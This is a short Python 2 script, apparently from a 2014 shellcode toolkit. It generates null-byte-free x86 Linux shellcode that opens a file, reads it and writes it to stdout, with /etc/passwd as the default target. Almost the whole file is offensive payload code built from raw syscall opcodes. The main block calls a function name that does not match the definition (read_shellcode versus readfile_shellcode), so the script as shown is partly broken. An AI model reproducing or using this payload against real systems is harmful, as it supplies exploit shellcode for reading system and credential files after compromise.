from struct import pack
from init_regs import *
from description import *
from padding import *
from out_format import *

##########################################################
#
#  readfile shellcode
#  
#
#	                         random	     2014-04-21
##########################################################

des_format = 'shellcode | readfile | %s' 
FILENAME = '/etc/passwd'
STDOUT = 1
ALIGN  = 4

##########################################################

def readfile_shellcode(filepath , r_size , fd = STDOUT):
	if (not r_size & 0xFF) or (not r_size>>8 & 0xFF) :
		print 'r_size contains null bytes'
		return 
	if len(filepath) % 4 :
		filepath = PaddingFilepath(filepath,ALIGN)
	strlen = len(filepath)
	cnt = strlen / 4
	shellcode = ''
	#add filepath
	shellcode += '\x31\xc0\x50'											#xor eax,eax#push eax  ----->  as null bytes
	filepath = filepath[::-1]													#reverse str
	for i in xrange(cnt):
		shellcode += '\x68'													#push opcode
		shellcode += filepath[i*ALIGN:(i+1)*ALIGN][::-1]		#reverse
	shellcode += '\x89\xe3\x31\xc9\xb0\x05\xcd\x80\x89\xc6\x66\x81\xec'
	shellcode += pack('<H',(r_size))
	shellcode += '\x89\xf3\x89\xe1\x66\xba'
	shellcode += pack('<H',(r_size))
	shellcode += '\xb0\x03\xcd\x80\x31\xdb\xb3'
	shellcode += chr(fd)
	shellcode += '\x89\xe1\x89\xc2\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x40\xb3\x01\xcd\x80'
	return shellcode


if __name__ == '__main__':
	shellcode = init_regs_shellcode()
	shellcode += read_shellcode(filepath=FILENAME,r_size=0x0101,fd = STDOUT)
	out_format(language='c',ouput=shellcode)




